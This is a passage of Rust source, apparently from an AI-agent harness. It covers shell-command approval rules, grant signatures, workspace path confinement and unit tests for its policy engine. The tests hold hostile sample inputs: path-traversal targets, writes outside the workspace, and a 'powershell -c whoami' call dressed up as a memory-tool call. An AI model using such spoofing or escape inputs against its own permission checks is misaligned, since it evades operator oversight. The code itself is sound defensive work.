        if exe_base == "node" && args.iter().any(|a| is_node_inline_eval_flag(a)) {
            return ShellCommandClass::RequiresAsk(String::from(
                "inline `node` script evaluation requires owner approval",
            ));
        }

        if exe_base == "uv" {
            if args.iter().any(|a| {
                let lower = a.to_ascii_lowercase();
                *a == "-C"
                    || a.starts_with("-C")
                    || lower == "--directory"
                    || lower.starts_with("--directory=")
                    || lower == "--project"
                    || lower.starts_with("--project=")
            }) {
                return ShellCommandClass::RequiresAsk(String::from(
                    "uv directory override flag requires owner approval",
                ));
            }
            if let Some(sub) = args.iter().find(|a| !a.starts_with('-'))
                && matches!(
                    sub.to_ascii_lowercase().as_str(),
                    "pip" | "add" | "sync" | "tool" | "publish" | "self" | "uvx"
                )
            {
                return ShellCommandClass::RequiresAsk(format!(
                    "uv subcommand `{sub}` installs dependencies or performs external mutation"
                ));
            }
        }

        if exe_base == "go" {
            if args.iter().any(|a| *a == "-C" || a.starts_with("-C")) {
                return ShellCommandClass::RequiresAsk(String::from(
                    "go `-C` directory override requires owner approval",
                ));
            }
            if let Some(sub) = args.iter().find(|a| !a.starts_with('-'))
                && matches!(sub.to_ascii_lowercase().as_str(), "run" | "get" | "install")
            {
                return ShellCommandClass::RequiresAsk(format!(
                    "go subcommand `{sub}` fetches packages or executes arbitrary programs"
                ));
            }
        }
    }

    ShellCommandClass::SafeLocal
}

/// Computes a stable, narrow command signature for scoping shell `CapabilityGrant` records
/// (e.g., `"git push origin branch-a"` -> `"git push"`, `"cargo test && curl https://x"` ->
/// `"cargo test && curl"`). Commands with subshells, redirections, inline script eval, or raw
/// shell interpreters fall back to an exact normalized command signature so approving one
/// sensitive command NEVER grants wildcard arbitrary execution.
#[must_use]
pub fn normalize_shell_grant_signature(cmd: &str) -> String {
    normalize_shell_grant_signature_for_platform(cmd, cfg!(windows))
}

fn collapse_whitespace_lower(raw: &str) -> String {
    raw.split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_ascii_lowercase()
}

#[expect(
    clippy::too_many_lines,
    reason = "computes narrow shell grant signatures across compound segments, redirections, interpreters, and subcommand CLIs"
)]
fn normalize_shell_grant_signature_for_platform(cmd: &str, is_windows: bool) -> String {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return String::from("__empty__");
    }
    if contains_subshell_or_escape_syntax(trimmed, is_windows).is_some() {
        return collapse_whitespace_lower(trimmed);
    }
    let Ok(segments) = split_shell_segments(trimmed, is_windows) else {
        return collapse_whitespace_lower(trimmed);
    };
    if segments.is_empty() {
        return String::from("__empty__");
    }

    let mut sigs = Vec::with_capacity(segments.len());
    for seg in &segments {
        let tokens = tokenize_shell_segment(seg, is_windows);
        if tokens.is_empty() {
            return collapse_whitespace_lower(trimmed);
        }
        let mut has_non_harmless_redir = false;
        let mut ti = 0;
        while ti < tokens.len() {
            let tok = &tokens[ti];
            if tok.has_unquoted_redir {
                if is_harmless_shell_redir(&tok.text) {
                    ti += 1;
                    continue;
                }
                if matches!(tok.text.as_str(), ">" | "1>" | "2>")
                    && let Some(next) = tokens.get(ti + 1)
                    && !next.has_unquoted_redir
                    && is_null_sink_path(&next.text)
                {
                    ti += 2;
                    continue;
                }
                has_non_harmless_redir = true;
                break;
            }
            ti += 1;
        }
        if has_non_harmless_redir || is_env_assignment_token(&tokens[0].text).is_some() {
            sigs.push(collapse_whitespace_lower(seg));
            continue;
        }

        let raw_exe = &tokens[0].text;
        let args: Vec<&str> = tokens[1..]
            .iter()
            .filter(|t| !t.has_unquoted_redir)
            .map(|t| t.text.as_str())
            .collect();
        let exe_lower = raw_exe.to_ascii_lowercase();
        let exe_norm = if exe_lower.contains('/') || exe_lower.contains('\\') {
            exe_lower.replace('\\', "/")
        } else {
            exe_lower
                .strip_suffix(".exe")
                .or_else(|| exe_lower.strip_suffix(".cmd"))
                .or_else(|| exe_lower.strip_suffix(".bat"))
                .unwrap_or(&exe_lower)
                .to_owned()
        };

        // Raw shell interpreters & inline script evals MUST be pinned to exact command text!
        let force_exact = matches!(
            exe_norm.as_str(),
            "sh" | "bash" | "zsh" | "fish" | "cmd" | "powershell" | "pwsh"
        ) || (matches!(exe_norm.as_str(), "python" | "python3")
            && args.iter().any(|a| is_python_inline_eval_flag(a)))
            || (exe_norm == "node" && args.iter().any(|a| is_node_inline_eval_flag(a)))
            || (exe_norm == "git"
                && args
                    .iter()
                    .any(|a| is_dangerous_git_global_option(a) || is_dangerous_git_long_option(a)));
        if force_exact {
            sigs.push(collapse_whitespace_lower(seg));
            continue;
        }

        let is_subcommand_cli = matches!(
            exe_norm.as_str(),
            "git"
                | "cargo"
                | "npm"
                | "pnpm"
                | "yarn"
                | "uv"
                | "go"
                | "docker"
                | "kubectl"
                | "gh"
                | "dotnet"
                | "pip"
                | "pip3"
                | "aws"
                | "gcloud"
                | "az"
        );
        if is_subcommand_cli {
            let subcmd = args
                .iter()
                .find(|a| !a.starts_with('-') && (exe_norm != "cargo" || !a.starts_with('+')));
            if let Some(sub) = subcmd {
                sigs.push(format!("{exe_norm} {}", sub.to_ascii_lowercase()));
            } else {
                sigs.push(exe_norm);
            }
        } else {
            sigs.push(exe_norm);
        }
    }

    sigs.join(" && ")
}

fn has_any_json_key(raw_input: &serde_json::Value, keys: &[&str]) -> bool {
    let Some(obj) = raw_input.as_object() else {
        return false;
    };
    keys.iter().any(|k| obj.contains_key(*k))
}

fn is_execute_tool(tool_lower: &str, tool_kind: &str, raw_input: &serde_json::Value) -> bool {
    tool_kind.eq_ignore_ascii_case("execute")
        || matches!(
            tool_lower,
            "run_command"
                | "bash"
                | "sh"
                | "zsh"
                | "fish"
                | "powershell"
                | "pwsh"
                | "cmd"
                | "shell"
                | "exec"
                | "execute"
                | "terminal"
                | "send_command_input"
        )
        || has_any_json_key(raw_input, SHELL_INPUT_KEYS)
}

fn is_write_tool(tool_lower: &str, tool_kind: &str) -> bool {
    tool_kind.eq_ignore_ascii_case("edit")
        || tool_kind.eq_ignore_ascii_case("delete")
        || tool_kind.eq_ignore_ascii_case("move")
        || matches!(
            tool_lower,
            "write_file"
                | "write_to_file"
                | "edit_file"
                | "replace_file_content"
                | "multi_replace_file_content"
                | "delete_file"
                | "create_file"
                | "move_file"
        )
        || tool_lower.starts_with("write_")
        || tool_lower.starts_with("edit_")
        || tool_lower.starts_with("replace_")
        || tool_lower.starts_with("multi_replace_")
}

fn is_read_tool(tool_lower: &str, tool_kind: &str) -> bool {
    tool_kind.eq_ignore_ascii_case("read")
        || tool_kind.eq_ignore_ascii_case("search")
        || matches!(
            tool_lower,
            "read_file"
                | "view_file"
                | "list_dir"
                | "find_by_name"
                | "grep_search"
                | "view_file_outline"
                | "view_code_item"
        )
}

fn canonical_native_subagent_op(tool_lower: &str, tool_kind: &str) -> Option<&'static str> {
    if matches!(
        tool_kind.trim().to_ascii_lowercase().as_str(),
        "execute" | "edit" | "delete" | "move"
    ) {
        return None;
    }
    NATIVE_SUBAGENT_OPS.into_iter().find(|&op| tool_lower == op)
}

fn match_registered_mcp_server<'a>(
    tool_lower: &str,
    registered: &'a BTreeSet<String>,
) -> Option<&'a str> {
    if registered.is_empty() {
        return None;
    }
    // A11: Match strictly against the registered MCP server prefix on `tool_lower` — NEVER trust `title`!
    for srv in registered {
        let srv_lower = srv.to_ascii_lowercase();
        let srv_under = srv_lower.replace('-', "_");
        if tool_lower == srv_lower
            || tool_lower.starts_with(&format!("{srv_lower}:"))
            || tool_lower.starts_with(&format!("{srv_lower}/"))
            || tool_lower.starts_with(&format!("{srv_lower}__"))
            || tool_lower.starts_with(&format!("mcp:{srv_lower}"))
            || tool_lower.starts_with(&format!("mcp__{srv_lower}__"))
            || tool_lower.starts_with(&format!("mcp_{srv_lower}_"))
            || tool_lower.starts_with(&format!("mcp__{srv_under}__"))
            || tool_lower.starts_with(&format!("mcp_{srv_under}_"))
        {
            return Some(srv.as_str());
        }
    }
    None
}

fn canonical_memory_mcp_op(
    tool_lower: &str,
    tool_kind: &str,
    raw_input: &serde_json::Value,
) -> Option<&'static str> {
    if is_execute_tool(tool_lower, tool_kind, raw_input)
        || is_write_tool(tool_lower, tool_kind)
        || is_read_tool(tool_lower, tool_kind)
        || has_any_json_key(raw_input, FILE_TARGET_INPUT_KEYS)
    {
        return None;
    }

    if tool_lower == "mcp:dennett-memory" {
        return Some("mcp:dennett-memory");
    }

    for op in MEMORY_MCP_OPS {
        if tool_lower == op {
            return Some(op);
        }
        if let Some(prefix) = tool_lower.strip_suffix(op)
            && matches!(
                prefix,
                "mcp:"
                    | "mcp__"
                    | "mcp_dennett-memory_"
                    | "mcp__dennett-memory__"
                    | "mcp_dennett_memory_"
                    | "mcp__dennett_memory__"
                    | "dennett-memory:"
                    | "dennett-memory/"
                    | "dennett-memory."
                    | "dennett-memory__"
                    | "dennett_memory:"
                    | "dennett_memory/"
                    | "dennett_memory."
                    | "dennett_memory__"
            )
        {
            return Some(op);
        }
    }
    None
}

fn canonical_control_skill_mcp_op(
    tool_lower: &str,
    tool_kind: &str,
    raw_input: &serde_json::Value,
) -> Option<&'static str> {
    if is_execute_tool(tool_lower, tool_kind, raw_input)
        || is_write_tool(tool_lower, tool_kind)
        || has_any_json_key(raw_input, FILE_TARGET_INPUT_KEYS)
    {
        return None;
    }

    for op in CONTROL_MCP_SKILL_OPS {
        if tool_lower == op {
            return Some(op);
        }
        if let Some(prefix) = tool_lower.strip_suffix(op)
            && matches!(
                prefix,
                "mcp:"
                    | "mcp__"
                    | "mcp_dennett-control_"
                    | "mcp__dennett-control__"
                    | "mcp_dennett_control_"
                    | "mcp__dennett_control__"
                    | "dennett-control:"
                    | "dennett-control/"
                    | "dennett-control."
                    | "dennett-control__"
                    | "dennett_control:"
                    | "dennett_control/"
                    | "dennett_control."
                    | "dennett_control__"
            )
        {
            return Some(op);
        }
    }
    None
}

fn canonical_control_mcp_op(
    tool_lower: &str,
    tool_kind: &str,
    raw_input: &serde_json::Value,
) -> Option<&'static str> {
    if is_execute_tool(tool_lower, tool_kind, raw_input)
        || is_write_tool(tool_lower, tool_kind)
        || is_read_tool(tool_lower, tool_kind)
        || has_any_json_key(raw_input, FILE_TARGET_INPUT_KEYS)
    {
        return None;
    }

    for op in CONTROL_MCP_OPS {
        if tool_lower == op {
            return Some(op);
        }
        if let Some(prefix) = tool_lower.strip_suffix(op)
            && matches!(
                prefix,
                "mcp:"
                    | "mcp__"
                    | "mcp_dennett-control_"
                    | "mcp__dennett-control__"
                    | "mcp_dennett_control_"
                    | "mcp__dennett_control__"
                    | "dennett-control:"
                    | "dennett-control/"
                    | "dennett-control."
                    | "dennett-control__"
                    | "dennett_control:"
                    | "dennett_control/"
                    | "dennett_control."
                    | "dennett_control__"
            )
        {
            return Some(op);
        }
    }
    None
}

fn collect_file_targets(req: &PolicyEvaluationRequest) -> Vec<String> {
    let mut targets = Vec::new();
    let mut push_unique = |candidate: &str| {
        let trimmed = candidate.trim();
        if !trimmed.is_empty() && !targets.iter().any(|existing| existing == trimmed) {
            targets.push(trimmed.to_owned());
        }
    };

    if let Some(ref primary) = req.target {
        push_unique(primary);
    }
    for loc in &req.locations {
        push_unique(loc);
    }
    for key in FILE_TARGET_INPUT_KEYS {
        if let Some(val) = req.raw_input.get(*key).and_then(serde_json::Value::as_str) {
            push_unique(val);
        }
    }
    targets
}

fn rule_matches_any(rule: &PolicyRule, tool_lower: &str, targets: &[&str]) -> bool {
    if targets.is_empty() {
        return rule_matches(rule, tool_lower, None);
    }
    targets
        .iter()
        .any(|target| rule_matches(rule, tool_lower, Some(target)))
}

/// D2-SEC-02: `Allow` rules with a non-wildcard `target_pattern` MUST require a non-empty target
/// set AND match EVERY target in the request (never permitting compound requests where a secondary
/// target escapes the allowed prefix).
fn rule_matches_all_for_allow(rule: &PolicyRule, tool_lower: &str, targets: &[&str]) -> bool {
    let has_specific_target = rule
        .target_pattern
        .as_deref()
        .map(str::trim)
        .is_some_and(|p| !p.is_empty() && p != "*");
    if !has_specific_target {
        return rule_matches(rule, tool_lower, None);
    }
    !targets.is_empty()
        && targets
            .iter()
            .all(|target| rule_matches(rule, tool_lower, Some(target)))
}

fn rule_matches(rule: &PolicyRule, tool_lower: &str, target: Option<&str>) -> bool {
    let pattern = rule.tool_name.trim().to_ascii_lowercase();
    let tool_ok = if pattern == "*" {
        true
    } else if let Some(prefix) = pattern.strip_suffix('*') {
        tool_lower.starts_with(prefix)
    } else {
        tool_lower == pattern
    };
    if !tool_ok {
        return false;
    }

    let Some(target_pat) = rule
        .target_pattern
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
    else {
        return true;
    };
    if target_pat == "*" {
        return true;
    }
    let Some(actual) = target.map(str::trim).filter(|s| !s.is_empty()) else {
        return false;
    };

    let norm_pat = target_pat.replace('\\', "/").to_ascii_lowercase();
    let norm_actual = actual.replace('\\', "/").to_ascii_lowercase();
    if let Some(prefix) = norm_pat.strip_suffix('*') {
        norm_actual.starts_with(prefix)
    } else {
        norm_actual == norm_pat || norm_actual.starts_with(&format!("{norm_pat}/"))
    }
}

fn matches_any_prefix(rel_path: &str, allowed_prefixes: &[String]) -> bool {
    let norm_rel = rel_path.replace('\\', "/");
    for raw in allowed_prefixes {
        let trimmed = raw.trim().replace('\\', "/");
        let clean = trimmed.trim_start_matches("./").trim_end_matches('/');
        if clean.is_empty() {
            continue;
        }
        let matches = if cfg!(windows) {
            norm_rel.eq_ignore_ascii_case(clean)
                || norm_rel
                    .to_ascii_lowercase()
                    .starts_with(&format!("{}/", clean.to_ascii_lowercase()))
        } else {
            norm_rel == clean || norm_rel.starts_with(&format!("{clean}/"))
        };
        if matches {
            return true;
        }
    }
    false
}

/// Resolves `raw_target` strictly inside `workspace_root`, rejecting `..` traversal,
/// absolute escapes, and symlink/NTFS-junction escapes outside the canonical workspace root.
///
/// Returns the normalized workspace-relative path (`/`-separated) when safe.
///
/// # Errors
///
/// Returns a safe explanation string when the path escapes or cannot be verified within workspace.
pub fn resolve_within_workspace(workspace_root: &Path, raw_target: &str) -> Result<String, String> {
    if raw_target.as_bytes().contains(&0) {
        return Err(String::from("denied path containing NUL byte"));
    }

    let canonical_root = fs::canonicalize(workspace_root).map_err(|err| {
        format!(
            "denied: workspace root `{}` could not be canonicalized: {err}",
            workspace_root.display()
        )
    })?;

    let joined = normalize_candidate_path(&canonical_root, raw_target)?;

    // Walk ancestors up to the deepest existing node and canonicalize it to detect symlink/junction escapes!
    let mut existing = joined;
    let mut non_existing_suffix: Vec<std::ffi::OsString> = Vec::new();
    while !existing.exists() {
        // Even if the path doesn't resolve via `exists()`, check `symlink_metadata` in case
        // it is a broken symlink/reparse point pointing outside the workspace!
        if fs::symlink_metadata(&existing).is_ok() {
            return Err(format!(
                "denied path `{raw_target}`: dangling symlink/reparse point is forbidden"
            ));
        }
        let Some(name) = existing.file_name().map(ToOwned::to_owned) else {
            return Err(format!(
                "denied path `{raw_target}`: cannot resolve within workspace boundary"
            ));
        };
        non_existing_suffix.push(name);
        if !existing.pop() {
            return Err(format!(
                "denied path `{raw_target}`: escaped filesystem root"
            ));
        }
    }

    let canonical_existing = fs::canonicalize(&existing).map_err(|err| {
        format!("denied path `{raw_target}`: failed canonicalizing ancestor: {err}")
    })?;

    if !canonical_existing.starts_with(&canonical_root) {
        return Err(format!(
            "denied path `{raw_target}`: target escapes project workspace boundary (including symlink/junction check)"
        ));
    }

    // Reassemble the canonical target path with any non-existing trailing segments.
    let mut full_canonical = canonical_existing;
    for seg in non_existing_suffix.into_iter().rev() {
        full_canonical.push(seg);
    }

    let rel = full_canonical
        .strip_prefix(&canonical_root)
        .map_err(|_| format!("denied path `{raw_target}`: target is outside workspace root"))?;
    let rel_str = rel
        .to_string_lossy()
        .replace('\\', "/")
        .trim_start_matches('/')
        .to_owned();
    Ok(rel_str)
}

fn normalize_candidate_path(canonical_root: &Path, raw_target: &str) -> Result<PathBuf, String> {
    // Handle `file://` URIs cleanly, strictly percent-decoding BEFORE `Path::components()` so
    // `%2e%2e`, `%2f`, `%5c`, or `%00` traversal tricks fail closed (D2-SEC-02).
    let trimmed_raw = raw_target.trim();
    let without_scheme = if let Some(rest) = trimmed_raw.strip_prefix("file://localhost/") {
        let decoded = strict_percent_decode_uri_path(rest, raw_target)?;
        format!("/{decoded}")
    } else if let Some(rest) = trimmed_raw.strip_prefix("file:///") {
        let decoded = strict_percent_decode_uri_path(rest, raw_target)?;
        format!("/{decoded}")
    } else if trimmed_raw.contains("://") {
        return Err(format!(
            "denied path `{raw_target}`: unsupported or remote URI scheme is forbidden"
        ));
    } else {
        trimmed_raw.to_owned()
    };

    // Strip leading `/C:/...` style URL paths emitted occasionally by ACP file tools on Windows.
    let cleaned_raw = strip_leading_slash_before_drive(&without_scheme);
    let candidate_path = PathBuf::from(cleaned_raw);
    let is_abs = candidate_path.is_absolute();

    // Reject explicit parent directory traversal (`..`), UNC/device prefixes, and
    // non-absolute Windows drive-relative (`C:foo.txt`) or root-relative (`\foo`) paths!
    let mut joined = if is_abs {
        PathBuf::new()
    } else {
        canonical_root.to_path_buf()
    };
    for comp in candidate_path.components() {
        match comp {
            Component::ParentDir => {
                return Err(format!(
                    "denied path `{raw_target}`: parent-directory traversal (`..`) is forbidden"
                ));
            }
            Component::Prefix(prefix) => {
                if !is_abs {
                    return Err(format!(
                        "denied path `{raw_target}`: drive-relative path is forbidden"
                    ));
                }
                if matches!(
                    prefix.kind(),
                    std::path::Prefix::UNC(..)
                        | std::path::Prefix::VerbatimUNC(..)
                        | std::path::Prefix::DeviceNS(..)
                ) {
                    return Err(format!(
                        "denied path `{raw_target}`: UNC or device namespace path is forbidden"
                    ));
                }
                joined.push(prefix.as_os_str());
            }
            Component::RootDir => {
                if !is_abs {
                    return Err(format!(
                        "denied path `{raw_target}`: drive-root-relative path is forbidden"
                    ));
                }
                joined.push(comp.as_os_str());
            }
            Component::Normal(seg) => joined.push(seg),
            Component::CurDir => {}
        }
    }
    Ok(joined)
}

fn strict_percent_decode_uri_path(uri_rest: &str, raw_target: &str) -> Result<String, String> {
    let bytes = uri_rest.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            if i + 2 >= bytes.len() {
                return Err(format!(
                    "denied path `{raw_target}`: malformed percent-encoding in file URI"
                ));
            }
            let (Some(hi), Some(lo)) = (hex_nibble(bytes[i + 1]), hex_nibble(bytes[i + 2])) else {
                return Err(format!(
                    "denied path `{raw_target}`: invalid hex digits in file URI percent-encoding"
                ));
            };
            let decoded_byte = (hi << 4) | lo;
            if decoded_byte == 0 {
                return Err(format!(
                    "denied path `{raw_target}`: percent-encoded NUL byte in file URI is forbidden"
                ));
            }
            out.push(decoded_byte);
            i += 3;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    let decoded = String::from_utf8(out)
        .map_err(|_| format!("denied path `{raw_target}`: file URI decoded to invalid UTF-8"))?;
    if decoded.contains('\\') {
        return Err(format!(
            "denied path `{raw_target}`: backslash separator inside file URI is forbidden"
        ));
    }
    Ok(decoded)
}

const fn hex_nibble(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

fn strip_leading_slash_before_drive(raw: &str) -> &str {
    let bytes = raw.as_bytes();
    if cfg!(windows)
        && bytes.len() >= 3
        && bytes[0] == b'/'
        && bytes[1].is_ascii_alphabetic()
        && bytes[2] == b':'
    {
        &raw[1..]
    } else {
        raw
    }
}

#[cfg(test)]
mod tests {
    use proptest::prelude::*;
    use serde_json::json;

    use super::*;
    use dennett_contracts::{PolicyRuleId, RunId};

    fn make_req(tool_name: &str, tool_kind: &str, target: Option<&str>) -> PolicyEvaluationRequest {
        PolicyEvaluationRequest {
            session_id: SessionId::new(),
            run_id: RunId::new(),
            tool_call_id: String::from("call-1"),
            tool_name: tool_name.to_owned(),
            tool_kind: tool_kind.to_owned(),
            title: format!("{tool_name} {}", target.unwrap_or_default()),
            target: target.map(str::to_owned),
            locations: Vec::new(),
            raw_input: json!({}),
        }
    }

    fn temp_workspace(label: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "dennett-policy-test-{label}-{}",
            uuid::Uuid::new_v4().simple()
        ));
        fs::create_dir_all(&dir).expect("create temp workspace");
        dir
    }

    #[test]
    fn policy_engine_enforces_workspace_boundary_deny_override_and_default_deny() {
        let ws = temp_workspace("core");
        let outside = temp_workspace("outside");
        let scope_alpha = MemoryScope::try_new("project-alpha").expect("scope");

        let allow_all_rule = PolicyRule {
            rule_id: PolicyRuleId::new(),
            scope: String::from("global"),
            tool_name: String::from("*"),
            target_pattern: None,
            effect: PolicyEffect::Allow,
            reason: String::from("overly broad allow"),
            created_at: TimestampMs::now(),
        };
        let deny_shell_rule = PolicyRule {
            rule_id: PolicyRuleId::new(),
            scope: String::from("global"),
            tool_name: String::from("run_command"),
            target_pattern: None,
            effect: PolicyEffect::Deny,
            reason: String::from("shell commands denied"),
            created_at: TimestampMs::now(),
        };

        let engine = PolicyEngine::new(PolicyContext {
            project_id: Some(ProjectId::new()),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::AllowPaths {
                allowed_prefixes: vec![String::from("docs/")],
            },
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::from([scope_alpha]),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![allow_all_rule, deny_shell_rule],
        });

        // 1. Traversal escape is ALWAYS denied even with wildcard Allow rule!
        let escape = engine.evaluate_request(&make_req("write_file", "edit", Some("../evil.txt")));
        assert_eq!(escape.effect, PolicyEffect::Deny);

        // 2. Absolute outside path is ALWAYS denied!
        let outside_file = outside.join("steal.txt");
        let abs_escape = engine.evaluate_request(&make_req(
            "write_file",
            "edit",
            Some(&outside_file.to_string_lossy()),
        ));
        assert_eq!(abs_escape.effect, PolicyEffect::Deny);

        // 3. Path inside workspace but outside `docs/` prefix is denied!
        let wrong_subdir =
            engine.evaluate_request(&make_req("write_file", "edit", Some("src/main.rs")));
        assert_eq!(wrong_subdir.effect, PolicyEffect::Deny);

        // 4. Path inside `docs/` prefix is allowed!
        let ok_write =
            engine.evaluate_request(&make_req("write_file", "edit", Some("docs/report.md")));
        assert_eq!(ok_write.effect, PolicyEffect::Allow);

        // 5. Explicit Deny beats Allow!
        let denied_shell =
            engine.evaluate_request(&make_req("run_command", "execute", Some("echo hi")));
        assert_eq!(denied_shell.effect, PolicyEffect::Deny);
        assert!(denied_shell.matched_rule_id.is_some());

        // 6. Memory MCP tool enforces allowed_memory_scopes!
        let mut bad_mem = make_req("memory_write_note", "other", Some("project-beta"));
        bad_mem.raw_input = json!({"scope": "project-beta"});
        assert_eq!(engine.evaluate_request(&bad_mem).effect, PolicyEffect::Deny);

        let mut good_mem = make_req("memory_write_note", "other", Some("project-alpha"));
        good_mem.raw_input = json!({"scope": "project-alpha"});
        assert_eq!(
            engine.evaluate_request(&good_mem).effect,
            PolicyEffect::Allow
        );

        let _ = fs::remove_dir_all(&ws);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn policy_engine_default_denies_unknown_dangerous_tools() {
        let ws = temp_workspace("default-deny");
        let engine = PolicyEngine::new(PolicyContext {
            project_id: Some(ProjectId::new()),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });

        assert_eq!(
            engine
                .evaluate_request(&make_req("run_command", "execute", Some("dir")))
                .effect,
            PolicyEffect::Deny
        );
        assert_eq!(
            engine
                .evaluate_request(&make_req("write_file", "edit", Some("a.txt")))
                .effect,
            PolicyEffect::Deny
        );
        assert_eq!(
            engine
                .evaluate_request(&make_req("unknown_network_tool", "other", Some("http://x")))
                .effect,
            PolicyEffect::Deny
        );

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn defect1_shell_and_non_mcp_tools_cannot_bypass_policy_via_memory_substrings() {
        let ws = temp_workspace("defect1");
        let scope_alpha = MemoryScope::try_new("project-alpha").expect("scope");
        let engine = PolicyEngine::new(PolicyContext {
            project_id: Some(ProjectId::new()),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::from([scope_alpha]),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![],
        });

        // (a) Native `run_command` containing `dennett-memory` in CommandLine and title MUST be denied!
        let mut spoofed_shell = make_req(
            "run_command",
            "execute",
            Some("powershell -c whoami # dennett-memory"),
        );
        spoofed_shell.title = String::from("powershell -c whoami # dennett-memory");
        spoofed_shell.raw_input = json!({ "CommandLine": "powershell -c whoami # dennett-memory" });
        assert_eq!(
            engine.evaluate_request(&spoofed_shell).effect,
            PolicyEffect::Deny
        );

        // (b) Even if `kind` is `"other"` and `tool_name` claims `"memory_search"`, shell `CommandLine` MUST deny!
        let mut shell_in_mcp_clothing = make_req("memory_search", "other", Some("whoami"));
        shell_in_mcp_clothing.title = String::from("dennett-memory: memory_search");
        shell_in_mcp_clothing.raw_input = json!({ "CommandLine": "whoami" });
        assert_eq!(
            engine.evaluate_request(&shell_in_mcp_clothing).effect,
            PolicyEffect::Deny
        );

        // Unrecognized tool containing substring `memory_search` MUST NOT match MCP allow!
        let mut evil_sub = make_req("evil_shell_memory_search", "other", None);
        evil_sub.raw_input = json!({ "scope": "project-alpha" });
        assert_eq!(
            engine.evaluate_request(&evil_sub).effect,
            PolicyEffect::Deny
        );

        // (c) `memory_write_note` and `memory_correct_note` MUST require non-empty string `scope`!
        let missing_scope_write = make_req("memory_write_note", "other", None);
        assert_eq!(
            engine.evaluate_request(&missing_scope_write).effect,
            PolicyEffect::Deny
        );

        let mut non_string_scope_write = make_req("memory_write_note", "other", None);
        non_string_scope_write.raw_input = json!({ "scope": 123, "title": "x", "body": "y" });
        assert_eq!(
            engine.evaluate_request(&non_string_scope_write).effect,
            PolicyEffect::Deny
        );

        let missing_scope_correct = make_req("memory_correct_note", "other", None);
        assert_eq!(
            engine.evaluate_request(&missing_scope_correct).effect,
            PolicyEffect::Deny
        );

        // Genuine scoped MCP calls succeed.
        let mut ok_search = make_req("mcp__dennett-memory__memory_search", "other", None);
        ok_search.raw_input = json!({ "scope": "project-alpha", "query": "test" });
        assert_eq!(
            engine.evaluate_request(&ok_search).effect,
            PolicyEffect::Allow
        );

        let mut ok_write = make_req("dennett-memory:memory_write_note", "other", None);
        ok_write.raw_input = json!({ "scope": "project-alpha", "title": "t", "body": "b" });
        assert_eq!(
            engine.evaluate_request(&ok_write).effect,
            PolicyEffect::Allow
        );

        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn defect2_file_reads_fail_closed_check_all_locations_and_enforce_relative_deny_rules_on_abs_paths()
     {
        let ws = temp_workspace("defect2-ws");
        let outside = temp_workspace("defect2-out");
        fs::create_dir_all(ws.join("docs")).expect("create docs");
        fs::create_dir_all(ws.join("secrets")).expect("create secrets");
        fs::write(ws.join("docs").join("readme.md"), "public").expect("write readme");
        fs::write(ws.join("secrets").join("key.pem"), "SECRET").expect("write key");

        let deny_secrets = PolicyRule {
            rule_id: PolicyRuleId::new(),
            scope: String::from("global"),
            tool_name: String::from("*"),
            target_pattern: Some(String::from("secrets/*")),
            effect: PolicyEffect::Deny,
            reason: String::from("never read or write secrets directory"),
            created_at: TimestampMs::now(),
        };
        let engine = PolicyEngine::new(PolicyContext {
            project_id: Some(ProjectId::new()),
            project_lifecycle_state: ProjectLifecycleState::Active,
            workspace_bound: true,
            agent_id: AgentId::new(),
            session_id: SessionId::new(),
            task_id: None,
            workspace_root: ws.clone(),
            workspace_write_policy: WorkspaceWritePolicy::DenyAll,
            autonomy_mode: AutonomyMode::Auto,
            parent_write_ceiling: None,
            allowed_memory_scopes: BTreeSet::new(),
            registered_mcp_servers: BTreeSet::new(),
            task_budget_exhausted: false,
            rules: vec![deny_secrets],
        });

        // (a) Missing target on read tool MUST fail CLOSED (`Deny`)!
        let missing_read = make_req("read_file", "read", None);
        assert_eq!(
            engine.evaluate_request(&missing_read).effect,
            PolicyEffect::Deny
        );

        // Outside target via `DirectoryPath` / `SearchDirectory` / `SearchPath` MUST be denied!
        let mut outside_dir_req = make_req("list_dir", "read", None);
        outside_dir_req.raw_input = json!({ "DirectoryPath": outside.to_string_lossy() });
        assert_eq!(
            engine.evaluate_request(&outside_dir_req).effect,
            PolicyEffect::Deny
        );

        // Secondary escaping location in `locations[1]` MUST be denied even when `target` is inside ws!
        let mut multi_loc_escape = make_req("read_file", "read", Some("docs/readme.md"));
        multi_loc_escape.locations = vec![
            String::from("docs/readme.md"),
            outside.to_string_lossy().into_owned(),
        ];
        assert_eq!(
            engine.evaluate_request(&multi_loc_escape).effect,
            PolicyEffect::Deny
        );

